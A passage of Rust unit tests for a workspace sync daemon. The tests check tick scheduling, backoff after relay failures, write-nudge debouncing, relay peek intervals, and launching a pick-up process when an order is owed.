        // drives the real `tick`/`DaemonState` dedup instead.
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap(); // bound, but no endpoint anywhere
        let t0 = Instant::now();
        let wall0 = SystemTime::now();
        let mut state = always_due_state(t0, wall0);
        let spy = SpyPass::new();
        let resolved = [ws];

        let r1 = tick(&mut state, t0, wall0, &resolved, &spy, None);
        assert_eq!(
            r1.skipped_no_endpoint.len(),
            1,
            "first pass: newly skipped, worth a warning"
        );

        let t1 = t0 + Duration::from_secs(1);
        let r2 = tick(&mut state, t1, wall0, &resolved, &spy, None);
        assert!(
            r2.skipped_no_endpoint.is_empty(),
            "same workspace, second pass: already warned once this run — silent. A bug that \
             moved `warned_no_endpoint` inside the per-tick loop (once-per-pass instead of \
             once-per-run) would make THIS assertion fail, which is the property the removed \
             local-HashSet test could never catch"
        );
    }

    #[test]
    fn a_backed_off_workspace_is_excluded_from_the_next_tick_and_readmitted_after_its_delay() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let t0 = Instant::now();
        let wall0 = SystemTime::now();
        let mut state = always_due_state(t0, wall0);
        let spy = SpyPass::failing();
        let resolved = [ws];

        let r1 = tick(
            &mut state,
            t0,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert_eq!(r1.errors.len(), 1, "first attempt fails and is recorded");
        assert_eq!(spy.calls.borrow().len(), 1);

        // Still well inside the 300s (BACKOFF_BASE) window opened by the first failure.
        let t1 = t0 + Duration::from_secs(1);
        let r2 = tick(
            &mut state,
            t1,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            r2.errors.is_empty(),
            "backed off: excluded from this tick's sweep entirely"
        );
        assert_eq!(
            spy.calls.borrow().len(),
            1,
            "no new attempt while the backoff window is open"
        );

        // Past the 300s delay: the workspace is eligible again.
        let t2 = t0 + Duration::from_secs(301);
        let r3 = tick(
            &mut state,
            t2,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert_eq!(
            spy.calls.borrow().len(),
            2,
            "readmitted once the backoff delay elapsed"
        );
        assert_eq!(
            r3.errors.len(),
            1,
            "and the retry is attempted (and still fails)"
        );
    }

    #[test]
    fn the_first_write_of_a_workspace_whose_marker_did_not_exist_yet_is_a_nudge() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let marker = ws.dir.join("last-write");
        let _ = std::fs::remove_file(&marker);
        let t0 = Instant::now();
        let wall0 = SystemTime::now();
        let mut state = realistic_state(t0, wall0);
        let spy = SpyPass::new();
        let resolved = [ws];
        tick(
            &mut state,
            t0,
            wall0,
            &[],
            &spy,
            Some("https://relay.example"),
        );
        tick(
            &mut state,
            t0,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            spy.calls.borrow().is_empty(),
            "no marker, no write, no pass"
        );

        std::fs::write(&marker, b"").unwrap();
        let t1 = t0 + Duration::from_millis(100);
        tick(
            &mut state,
            t1,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        let t2 = t1 + Duration::from_secs(3);
        let r = tick(
            &mut state,
            t2,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert_eq!(
            r.synced.len(),
            1,
            "the marker appearing is the first write, and it is pushed"
        );
    }

    #[test]
    fn a_write_nudge_observed_between_ticks_produces_a_sweep() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let marker = ws.dir.join("last-write");
        std::fs::write(&marker, b"").unwrap();

        let t0 = Instant::now();
        let wall0 = SystemTime::now();
        let mut state = realistic_state(t0, wall0);
        let spy = SpyPass::new();
        let resolved = [ws];

        // Prime past the cold-start pass every fresh `DaemonState` is due for immediately
        // (finding 2, `a_fresh_scheduler_is_due_immediately_at_startup`) — a separate concern
        // from the write-nudge/debounce interaction this test exercises. Over an EMPTY resolved
        // list, so it consumes only the due-ness, not the marker's first sighting (that must
        // still happen at "Tick 1" below, unaffected).
        tick(
            &mut state,
            t0,
            wall0,
            &[],
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            spy.calls.borrow().is_empty(),
            "the priming pass has no workspaces to sweep"
        );

        // Tick 1: the marker's FIRST sighting is not itself a nudge, and the 300s interval has
        // not elapsed since the priming pass above — nothing runs.
        let r1 = tick(
            &mut state,
            t0,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            spy.calls.borrow().is_empty(),
            "first sighting alone must not fire a pass"
        );
        assert!(r1.synced.is_empty() && r1.errors.is_empty());

        // A local write happens between ticks: the marker's mtime moves forward.
        set_mtime(&marker, SystemTime::now() + Duration::from_secs(1));

        // Tick 2: the CHANGED mtime opens a nudge burst, but this same tick is still inside the
        // 2s debounce window, so the sweep does not run yet.
        let t1 = t0 + Duration::from_millis(100);
        let r2 = tick(
            &mut state,
            t1,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            spy.calls.borrow().is_empty(),
            "still inside the debounce window"
        );
        assert!(r2.synced.is_empty() && r2.errors.is_empty());

        // Tick 3: quiet for >= debounce since the nudge — the burst closes and the sweep runs.
        let t2 = t1 + Duration::from_secs(3);
        let r3 = tick(
            &mut state,
            t2,
            wall0,
            &resolved,
            &spy,
            Some("https://relay.example"),
        );
        assert_eq!(
            spy.calls.borrow().len(),
            1,
            "the nudge produced exactly one sweep"
        );
        assert_eq!(r3.synced.len(), 1);
    }

    // ---- the executing machine (6j6v.1c6k) ----------------------------------------------------

    /// Answers the cheap question from a script, and counts how often it was asked.
    struct SpyPeek {
        answer: std::result::Result<bool, ()>,
        asked: std::cell::Cell<usize>,
    }

    impl Peek for SpyPeek {
        fn anything_new(&self, _ws: &Workspace, _endpoint: &str) -> Result<bool> {
            self.asked.set(self.asked.get() + 1);
            self.answer
                .map_err(|()| crate::error::NxfError::io("relay down"))
        }
    }

    fn spy_peek(answer: std::result::Result<bool, ()>) -> SpyPeek {
        SpyPeek {
            answer,
            asked: std::cell::Cell::new(0),
        }
    }

    fn fresh_state(now: Instant) -> DaemonState {
        DaemonState::new(
            now,
            SystemTime::now(),
            Duration::from_secs(300),
            Duration::from_secs(2),
            Duration::from_secs(10),
            Duration::from_secs(30),
        )
    }

    #[test]
    fn something_new_at_the_relay_brings_the_pass_forward_within_seconds() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let t0 = Instant::now();
        let mut state = fresh_state(t0);
        state.scheduler.passed(t0); // a pass just ran: the next is 300 s away
        let spy = SpyPass::new();
        let peeker = spy_peek(Ok(true));
        assert!(peek(
            &mut state,
            t0,
            std::slice::from_ref(&ws),
            &peeker,
            Some("https://relay")
        ));
        let later = t0 + Duration::from_secs(3);
        let r = tick(
            &mut state,
            later,
            SystemTime::now(),
            std::slice::from_ref(&ws),
            &spy,
            Some("https://relay"),
        );
        assert_eq!(
            r.synced.len(),
            1,
            "the nudge ran a pass long before the interval"
        );
    }

    #[test]
    fn the_relay_is_asked_at_most_once_per_peek_interval_and_nothing_new_moves_nothing() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let t0 = Instant::now();
        let mut state = fresh_state(t0);
        let peeker = spy_peek(Ok(false));
        let one = std::slice::from_ref(&ws);
        assert!(!peek(&mut state, t0, one, &peeker, Some("https://relay")));
        assert!(!peek(
            &mut state,
            t0 + Duration::from_secs(5),
            one,
            &peeker,
            Some("https://relay")
        ));
        assert_eq!(peeker.asked.get(), 1, "not again inside {PEEK_EVERY:?}");
        peek(
            &mut state,
            t0 + PEEK_EVERY,
            one,
            &peeker,
            Some("https://relay"),
        );
        assert_eq!(peeker.asked.get(), 2);
    }

    #[test]
    fn a_peek_that_fails_leaves_that_relay_alone_for_a_backoff_and_an_unbound_one_is_never_asked() {
        let (_a, bound) = workspace();
        bind_join(&bound, "stream-one").unwrap();
        let (_b, unbound) = workspace();
        let t0 = Instant::now();
        let mut state = fresh_state(t0);
        let peeker = spy_peek(Err(()));
        let both = [bound.clone(), unbound.clone()];
        peek(&mut state, t0, &both, &peeker, Some("https://relay"));
        assert_eq!(peeker.asked.get(), 1, "only the bound workspace is asked");
        peek(
            &mut state,
            t0 + PEEK_EVERY,
            &both,
            &peeker,
            Some("https://relay"),
        );
        assert_eq!(
            peeker.asked.get(),
            1,
            "a failed peek is not retried every 15 s"
        );
        peek(
            &mut state,
            t0 + BACKOFF_BASE + PEEK_EVERY,
            &both,
            &peeker,
            Some("https://relay"),
        );
        assert_eq!(peeker.asked.get(), 2);
    }

    struct SpyOrders(std::result::Result<bool, ()>);

    impl Orders for SpyOrders {
        fn owed(&self, _ws: &Workspace) -> Result<bool> {
            self.0
                .map_err(|()| crate::error::NxfError::io("store locked"))
        }
    }

    #[test]
    fn a_pass_that_left_an_order_for_this_machine_starts_the_pickup_in_that_workspace() {
        let (_tmp, ws) = workspace();
        let label = ws.dir.display().to_string();
        let synced = vec![(label.clone(), PassOutcome::default())];
        let spawn = SpySpawn::default();
        let r = pick_up_owed(
            &synced,
            std::slice::from_ref(&ws),
            &SpyOrders(Ok(true)),
            &spawn,
        );
        assert_eq!(r.started, vec![label]);
        let started = spawn.started.borrow();
        assert_eq!(started.len(), 1);
        assert_eq!(started[0].0, ws.dir.parent().unwrap());
        assert_eq!(started[0].1, ["chat", "pick-up"]);
    }

    #[test]
    fn no_order_owed_starts_nothing_and_a_failed_look_is_reported() {
        let (_tmp, ws) = workspace();
        let synced = vec![(ws.dir.display().to_string(), PassOutcome::default())];
        let spawn = SpySpawn::default();
        let r = pick_up_owed(
            &synced,
            std::slice::from_ref(&ws),
            &SpyOrders(Ok(false)),
            &spawn,
        );
        assert!(r.started.is_empty() && r.errors.is_empty());
        let r = pick_up_owed(
            &synced,
            std::slice::from_ref(&ws),
            &SpyOrders(Err(())),
            &spawn,
        );
        assert_eq!(r.errors.len(), 1);
        assert!(spawn.started.borrow().is_empty());
    }

    #[test]
    fn only_a_workspace_that_synced_is_looked_at() {
        let (_tmp, ws) = workspace();
        let spawn = SpySpawn::default();
        let r = pick_up_owed(&[], std::slice::from_ref(&ws), &SpyOrders(Ok(true)), &spawn);
        assert!(r.started.is_empty());
    }
}
